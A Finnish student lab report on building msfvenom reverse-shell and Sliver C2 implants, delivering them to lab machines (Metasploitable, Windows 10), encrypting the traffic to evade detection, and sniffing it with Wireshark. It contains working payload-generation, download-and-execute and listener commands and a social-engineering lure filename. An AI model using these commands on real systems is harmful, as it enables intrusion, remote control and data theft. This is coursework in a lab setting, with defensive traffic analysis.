# Koita Simpukoita

## a) Venom. Tee msfvenom-työkalulla haittaohjelma, joka soittaa kotiin (reverse shell). Ota yhteys vastaan metasploitin multi/handler -työkalulla.

Aloitin tutustumalla msfvenomin käyttöön. CyberOffensiven video (CyberOffense, 17.4.2022) havainnollisti työkalun toimintaa hienosti. Tosin hänen esimerkissä hyökättiin windows järjestelmään. duck-secin reposta (duck-sec, 20.2.2024) löysin kätevän cheatsheetin eri payloadeista.

Loin payloadin msfvenomilla.
```
msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.56.101 LPORT=8080 -f elf > very_important_security_update.elf
```
- `-p` Määrittää että käytetään payloadia
- `linux/x86/shell/reverse_tcp` Linuxi x86 arkkitehtuurin reverse TCP shell scripti.
- `LHOST=192.168.56.101` Kuuntelevan koneen ip osoite
- `LPORT=8080` Kuuntelevan koneen kohdeportti
- `-f elf` Määritellään, että binääri luodaan elf-tiedostoon (Executable and Linkable Format). Tämä on standardi binääriformaatti *NIX järjestelmissä (wikipedia).
- `very_important_security_update.elf` Sosiaalisen manipuloinnin mestariteos. Tällä tiedostonimellä saadaan kohdekoneen käyttäjä klikkaamaan linkistä 100% varmuudella.

![](h6/create_venom_payload.png)

Jotta voisin saada tämän payloadin kohdekoneelle, päätin käyttää samaa tekniikkaa mitä esimerkkivideossa (CyberOffense, 17.4.2022) käytettiin.

Ensin loin uuden kansion johon siirsin binäärin.
```
mkdir security_updates
mv very_important_security_update.elf security_updates
```
![](h6/new_directory.png)

Laitoin tämän kansion pyörimään http -serverillä.

```
python3 -m http.server
```
- `-m http.server` Määritellään moduuli, jonka python3 ajaa. Tässä tapauksessa http.server.

![](h6/http.server.png)

Tämä pitää jättää terminaaliin pyörimään, jotta siihen voi ottaa yhteyden kohdekoneelta. Avasin siis uuden terminaalin ja siellä avasin palomuurista http -serverin portin sekä hyökkäyksessä käytettävää kuuntelevaa porttia.

```
sudo ufw allow 8080/tcp
sudo ufw allow 8000/tcp
```
![](h6/firewall.png)

Tässä kohtaa avasin vielä listenerin metasploitin avulla.

```
sudo msfconsole
search exploit/multi/handler
use 4
set LHOST 192.168.56.101
set LPORT 8080
run
```

![](h6/listener.png)

Sitten siirryin hölmön toimistorotan rooliin. IT-tuelta oli tullut sähköpostia, että koneeseeni on saatettu murtautua. Pitäisi äkkiä käydä antamassa seuraavat komennot terminaaliin, jotta tunkeutuminen saadaan estettyä.

```
wget 192.168.56.101:8000/very_important_security_update.elf
chmod u+x very_important_security_update.elf
./very_important_security_update.elf
```

Kaikki sujui ihan nätisti, kunnes haittaohjelma ajettiin.

Tuli ilmoitus, että haittaohjelma on ladattu onnistuneesti.
![](h6/GET_request.png)

Harri Hölmöläinen toisti antamani komennot.

![](h6/wget_haittaohjelma.png)

Kun haittaohjelma ajettiin, tuli segmentation fault.

![](h6/segmentation_fault.png)

Metasploitin päässä näin, että yhteyttä oltiin otettu oikeasta osoitteesta, mutta yhteys oli katkennut välittömästi.

![](h6/unsuccessful.png)

Selvittelin asiaa googlettamalla ja tekoäyn avulla, mutta en löytänyt siihen oikein mitään järkevää ratkaisua. Kohdekoneen arkkitehtuuri oli asetettu oikein (x86 = 32 bittinen).

![](h6/x86.png)

Ajattelin, että ongelma saattaa olla payloadissa itsessään. Käytin staged payloadia, ja mietin olisiko pitänyt käyttää stageless payloadia, mutta ainakin tämän artikkelin (Sahu, V 21.1.2024) mukaan juurikin staged payloadin käyttöön tarvitaan metasploitin multi/handler -työkalua.

Päätin kokeilla vielä meterpreter/reverse_tcp -payloadia.

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=8080 -f elf > linux_x86_meterpreter/reverse.elf
```

![](h6/meterpreter_payload.png)

Sitten kertasin kaikki muut aikaisemmat vaiheet, mutta myös tämä epäonnistui.

![](h6/meterpreter_fail.png)

Nyt mietin, että voisiko ongelma olla käyttämäni portti? Tuskin, koska näimme kuitenkin, että osoitteesta 192.168.56.102 oli yritetty avata yhteyttä. Päätin kuitenkin varmuuden vuoksi tehdä kaksi uutta binääriä, mutta nämä molemmat käyttävät nyt porttia 4444. Toinen on stageless ja toinen staged.

![](h6/port_4444.png)

Avasin portin 4444 ja suljin 8080. Aloitin kokeilemalla staged versiota, mutta jälleen kaatui segmentation vikaan.

![](h6/staged4444.png)

Lopulta kun kokeilin stageless payloadia niin sain reverse shellin avattua. En tiedä miksi juuri tämä toimi, sillä kaikissa ohjeissa mitä näin, neuvottiin tekemään staged payloadilla.

![](h6/stageless_download.png)
![](h6/stageless_success.png)

## b) Snif venom! Tarkastele ja analysoi msfvenomin muodostamaa reverse shell -yhteyttä. Käytä snifferiä, kuten Wireshark. Mitä havaitset? Mistä ominaisuuksista yhteyden voi tunnistaa? Millä muutoksilla tunnistamista voi vaikeuttaa?

### Snif

Aloitin tekemällä tcpdumpin.
```
sudo tcpdump -i eth1 -w capture.pcap
```
- `-i eth1` Kuuntele interface eth1:tä.
- `-w capture.pcap` Älä tulosta paketteja reaaliajassa vaan tallenna (write) ne tiedostoon capture.pcap

Sitten avasin uuden yhteyden multi/handleriin. Annoin muutaman komennon ja lopetin tcpdumpin.

![](h6/tcpdump.png)

Avasin tcpdumpin kirjoittaman tiedoston wiresharkilla.

```
wireshark capture.pcap
```

Kolmesta ensimmäisestä rivistä nähdään, että metasploitable on aloittanut kolmiosaisen kättelyn. Tämä on ensimmäinen asia johon kannattaa kiinnittää huomio jos kyseessä on palvelin johon on murtauduttu. Yleensä palvelin ei ole se joka tekee aloitteita.

![](h6/wireshark.png)

Wiresharkissa on hyödyllinen ominaisuus Follow TCP stream. Tämän saa käyttöön klikkaamalla hiiren vasemmalla ensimmäisestä paketista, ja valitsee follow -> TCP stream. Koska TCP -liikenne ei ole salattua, näemme liikenteen ja annetut komennot plaintextinä.

![](h6/follow_tcp.png)

Täällä näemme, että kali on lähettänyt echo stringin metasploitablelle (tämä oli ensimmäinen lähetetty paketti kättelyn jälkeen no. 11). Tämän jälkeen metasploitable on vastannut samalla stringillä. En löytänyt tähän mitään yksiselitteistä selitystä, mutta ChatGPT epäili että kyseessä on mekanismi, jolla metasploit tarkistaa että yhteys toimii.

Luulin, että shell oli taustalla, joten yritin avata sen. Väärä komento lähetettiin metasploitablelle, josta tuli vastaus että komentoa ei löydy.

Tämän jälkeen näkyy antamani whoami ja ip a -komennot sekä niiden vastaukset. Tämä on luonnollisesti iso punainen lippu. Jos kaapatuista paketeista näkyy, että joku kyselee TCP-yhteyden yli käyttäjätietojen perään tai yrittää selvitellä käytössä olevia interfaceja, kannattaa pikkuhiljaa huolestua.

### Salaus

Helpoin tapa vaikeuttaa tunnistamista on todennäköisesti yhteyden salaaminen. Ja tämä onnistuu varmaan helpoiten käyttämällä https-protokollaa.

msfvenomista löytyy yksi x86 arkkitehtuurin https payload.

![](h6/grep_https.png)

Loin uuden payloadin käyttämällä tätä. Lportiksi laitoin 443.

![](h6/https_payload.png)

Avasin palomuuriin portin 443 ja suljin 4444.
```
sudo ufw allow 443/tcp
sudo ufw deny 4444/tcp
```

Sitten siirsin tiedoston kohdekoneelle samaa tekniikkaa käyttäen kuin aikaisemmin ja annoin execute oikeudet.

![](h6/download_https.png)

Sitten kokeillaan toimiiko tämä suoraan multi/handlerin kanssa. Asetin kuuntelevaksi portiksi taas 443, laitoin tcpdumpin päälle ja käynnistin exploitin kohdekoneelta.

Tämä ei onnistunut. Näin liikennettä wiresharkissa ja metasploitable yritti selvästi avata yhteyttä, mutta shell-sessio ei avautunut.

Tässä kohtaa huomasin että payloadin tyyppiä voi vaihtaa multi/handlerissa, joten vaihdoin sen tuohon samaan, jonka olin valinnut msfvenomissa.

![](h6/change_payload_type.png)

Sitten kokeilin ajaa haittaohjelmaa uudestaan.

Nyt sain meterpreter session auki. Ehkä payload optionsin vaihtaminen olisi ollut ratkaisu edellisen tehtävän haasteisiin, harmi etten ollut silloin vielä huomannut sitä.

![](h6/https_success.png)

Nyt huomaamme, että tcpdumpin sisältö ei sisällä enää pelkkiä tcp-paketteja, vaan mukana on myös TLS-protokollaa. Siellä on mm. tarkistettu sertifikaatteja ja vaihdeltu kryptausavaimia.

![](h6/wireshark_https.png)

Lisäksi jos valitsemme taas follow tcp stream, niin näemme, että aikaisemmin selkokielisenä näkyneet syötteet ovat nyt kryptattu.

![](h6/https_follow_tcp.png)

Kyllähän tästä edelleen huomaa että jotain hämärää on tekeillä, mutta ainakin yhteyden salaus mahdollistaa sen, että tutkija ei suoraan tästä näe mitä hyökkääjä on tehnyt.

## c) Hello, Sliver. Näytä esimerkki http-yhteydestä Sliverillä.
### Asennus ja alustus
Tutustuin sliverin viralliseen dokumentaatioon (Sliver C2), sekä github sivuun (BishopFox).
Tero oli maininnut, että ChatGPT:ltä kannatta kysyä neuvoa asennukseen, sillä virallisen dokumentaation avulla ohjelmaa ei välttämättä saa kunnolla toimimaan. Asennus oli loppupeleissä melko kivuton.
```
curl https://sliver.sh/install | sudo bash
sliver-server
sliver-client
```
- curl komento asentaa itse sliverin. Outputti pipetetaan bashiin, jolloin asennus-scripti ajetaan heti.
![](h6/sliver%20asennus.png)

- sliver-server -komento generoi sertifikaatit, luo konfigit ja käynnistää C2-palvelimen.
![](h6/sliver-server.png)

- sliver-client -komento käynnistää ohjelman ja yhdistyy localhost-serveriin.
![](h6/sliver-client.png)

Palvelimen tilan voi tarkistaa komennolla
```
sudo systemctl status sliver
```
![](h6/sliver%20status.png)

### HTTP-listener
Virallisess dokumentaatiossa (Sliver C2) on hyvät ohjeet implantin luomiselle.

Aloitin irroittamalla koneen verkosta.
```
sudo ip link set eth0 down
```
Sitten avasin sliver serverin ja clientin. Clientissa loin implantin.
```
generate --http 192.168.56.101:80 --os linux --arch x86 --save payload.elf
```
- `--http` Käytetty tiedonsiirtoprotokolla.
- `192.168.56.101:80` Osoite ja portti joihin otetaan kohdekoneelta yhteyttä.
- `--os linux` Kohteen käyttöjärjestelmä.
- `--arch x86` Prosessorin arkkitehtuuri.
- `--save payload.elf` Implantti tallennetaan tällä nimellä.

![](h6/sliver%20ilmplant1.png)

Implantin kääntämisessä meni todella kauan ja pelkäsin jo pariin otteeseen että virtuaalikoneeni crashaa, mutta tulihan se valmiiksi lopulta.

Avasin tarvittavat portit 
```
sudo ufw allow 8000/tcp
sudo ufw allow 80/tcp
```
- 8000 on tiedoston siirtämistä varten ``python3 -m http.server``
- 80 on kuunteleva portti.

Sitten siirsin implantin metasploitableen totutulla tavalla ja annoin suoritusoikeudet.

Laitoin http listenerin päälle ja ajoin implantin, mutta mitään ei tapahtunt eikä sessioita avattu.

![](h6/sliver%20fail.png)

Yritin vielä luoda uuden implantin jossa --arch oli 386 ja --save ei ollut määritelty mitään, mutta tämäkään ei tuottanut tulosta.

![](h6/sliver%20implant2.png)

Tarkistin, että apache2 tai nginx ei ole päällä ja käytössä portissa 80. Tarkistin myös, että metasploitablesta saa yhteyden porttiin 80.

![](h6/ports.png)
![](h6/nc_metasploitable.png)

Vaikka koitin useamman kerran ajaa implanttia metasploitablella, niin mikään ei auttanut.
![](h6/no_connection.png)

Pitkän debuggauksen jälkeen ChatGPT oli sitä mieltä, että Metasploitable on vaan niin vanha kone (vanhentunut kernel), että näitä sofistikoituneita haittaohjelmia ei voida ajaa siinä. Mielenkiintoista nähdä oliko muilla kurssilaisilla vastaavanlaisia ongelmia kun saan raportin palautettua.

## m) Vapaaehtoinen: Asenna Windows-virtuaalikone ja tee kotiin soittava haittaohjelma siihen & c) Hello, Sliver. Näytä esimerkki http-yhteydestä Sliverillä.

Koska en saanut Sliveriä toimimaan metasploitablella, päätin tehdä tämän vapaaehtoisen tehtävän ja kokeilla sliveriä uudestaan windows kohdekoneella.

Latasin windows 10 iso-kuvan windowsin omilta sivuilta (windows). Annoin virtuaalikoneelle 4GB RAM:ia ja 2 CPU:ta. Verkkoadapteriksi Host-Only Adapter. Kun uusi virtuaalikone luodaan, on tärkeintä ottaa täppä pois kohdasta proceed with unattended istallation. Muuten windows herjaa käynnistyessään puuttuvasta product keystä.

![](h6/product%20key.png)

Manuaalisessa asennuksessa voi valita "I don't have a product key". Tämän jälkeen vaan seurataan Windows setup manageria. Tämä on melko intuitiivinen prosessi vaikka. Sitten Windows asentelee ja käynnistelee itseään aivan tautisen kauan. Odottelun jälkeen windows oli valmis hyökkäyksillemme.

![](h6/windows%20ready.png)

Tarkistin uuden koneen ip-osoitteen ja tarkistin että se saa yhteyden kaliin.

![](h6/windows%20ip.png)

Sitten tein uuden implantin windows järjestelmälle.

![](h6/windows%20implant.png)

Siirsin sen valittuun kansioon ja tein siitä http serverin.

![](h6/windows%20http.server.png)

Hakemistoni löytyi kun otti http serveriin yhteyttä selaimella. Latasin haittaohjelman klikkaamalla linkistä.

![](h6/windows%20download%20filw.png)

Kun ajoin haittaohjelman windows koneella, niin sain välittömästi yhteyden auki sliveriin. Tämä viittaisi siihen että ongelma oli tosiaan metasploitablessa.

![](h6/sliver%20session%20alive.png)

Session saa käyttöön `use <session id>` -komennolla.

![](h6/sliver%20use%20session.png)

Koska aikaa oli mennyt tuhottomasti sekä venomin että sliverin kanssa kikkailuun ja ongelmien debuggaamiseen, en ehtinyt tehdä kaikkia Teron antamia tehtäviä. Testailin silti hieman sliverin toimintoja sekä tarkastelin sliverin http -yhteyttä wiresharkilla, joten nämä tehtävät käyn vielä läpi tässä raportissa, mutta en ehdi tutustua sen enempää yhteyden ominaisuuksien muuttamiseen.

## d) Sniff Sliver! Tarkastele Sliverin http-yhteyttä snifferillä. Mitä havaitset? Mistä ominaisuuksista yhteyden voi tunnistaa?

Kun tarkastelin sliver-yhteyden tiedonsiirtoa, havaitsin, että liikenteessä on todella paljon GET-pyyntöjä. Tämä ei ole sinänsä yllättävää, sillä olimmehan tehneet http-yhteyden. Mikä itseäni kummastutti oli se, että GET-pyynnöt teki .103, eli windows kone johon murtauduttiin. Lisäksi Kali (tai siis sliver-server tässä tapauksessa) vastasi jatkuvasti 204 No Content. Keskustelin asiasta tekoälyn kanssa (ChatGPT). Ilmeisesti tämä johtuu siitä, että implantti on koodattu toimimaan beaconina.

Homma menee kutakuinkin näin: Implantti pollaa jatkuvasti sliver-serveriä. Jos käyttäjä ei ole antanut komentoja, vastaus on 204. Näitä GET-pyyntöjä lähetetään todella paljon. Kikkailin sliver sessiossa noin 24 minuuttia. Sinä aikana lähetettiin 2864 pakettia, joista 720 (25.1%) oli implantin lähettämiä GET-pyyntöjä.

Jos sliver-clientissä on annettu komento tämä lähetetään 200 OK response-bodyssä. Tämä ei kuitenkaan paljon auta kyberturva-analystia, sillä vaikka kyseessä on http-liikenne, sliver salaa paketeiden sisällön joko kryptaamalla tai obfuskoimalla.

- Kryptattu

![](h6/sliver%20kryptattu.png)

- Obfuskoitu (Tämä näyttää jonkin sorttiselta sanalistalta, mikä saa liikenteen näyttämään normaalilta vaikka se onkin todellisuudessa jokin salausmekanismi)

![](h6/sliver%20obfuskoitu.png)

## f) Sliverillä voi tehdä monenlaista kohteessa, ruutukaappauksista alkaen. Näytä esimerkkejä toiminnoista.

Sliver sessio muistuttaa jonkin verran meterpreteriä. Sillä voi antaa paljon erilaisia sisäänrakennettuja komentoja, tai avata shell session kohdekoneeseen.

Koska aika on rajallista, en lähtenyt perehtymään näihin ominaisuuksiin kovin syvällisesti, mutta käydään tässä läpi silti muutama joita kokeilin.

#### info
- info-komento antaa tietoa kohdekoneesta. Tämä ei varsinaisesti tarjoa mitään maata mullistavaa tietoa, mutta tällä voi tarkistaa että olemme tosiaan päässeet käsiksi kohdejärjestelmään.

![](h6/sliver%20info.png)

#### whoami & getprivs
- whoami kertoo minkä käyttäjän tunnuksia ollaan käyttämässä.
- getprivs kertoo mitä käyttöoikeuksia käyttäjällä on Windowsissa.

![](h6/sliver%20whoami%20getprivs.png)

#### ls & download
- ls komennolla voi tarkastella hakemistojen sisältöä. Tämä toimii hieman eri tavalla kun linuxissa. Itse sain sen toimimaan vain jos laitoin polun heittomerkkeihin.
- download komennolla voi ladata teidostoja. Tämäkin vaatii heittomerkit ympärille.

![](h6/sliver%20search%20download%20file.png)
![](h6/sliver%20download%202.png)

#### screenshot
- screenshot komennolla otetaan kuvakaappaus käyttäjän työpöydästä.

![](h6/sliver%20screenshot.png)
![](h6/sliver%20screenshot2.png)

## Lähteet
BishopFox. Sliver. Luettavissa: https://github.com/BishopFox/sliver. Luettu: 2.5.2026.

ChatGPT. "Miksi sliver-yhteydessä kohdekone lähettää jatkuvasti GET-pyyntöjä ja hyökkäävä kone vastaa 204 No Content?"

CyberOffense. 17.4.2022. Use Msfvenom to Create a Reverse TCP Payload. Katsottavissa: https://www.youtube.com/watch?v=ZqWfDrD2WVY. Katsottu: 28.4.2026.

duck-sec. 20.2.2024. msfvenom-revshell-cheatsheet. Luettavissa: https://github.com/duck-sec/msfvenom-revshell-cheatsheet. Luettu: 29.4.2026.

Sahu, V. 21.1.2024. Staged vs Non-staged Payloads in Cybersecurity. Luettavissa: https://www.scaler.com/topics/cyber-security/staged-vs-non-staged-payloads/. Luettu: 30.4.2026.

Sliver C2. Getting Started. Luettavissa. https://sliver.sh/docs/?name=Getting+Started. Luettu: 2.5.2026.

Wikipedia. Executable and Linkable Format. Luettavissa: https://en.wikipedia.org/wiki/Executable_and_Linkable_Format. Luettu: 30.4.2026. 

Windows. Windows 10 -asennustietovälineen luonti. Luettavissa: https://www.microsoft.com/fi-fi/software-download/windows10. Luettu: 3.5.2026.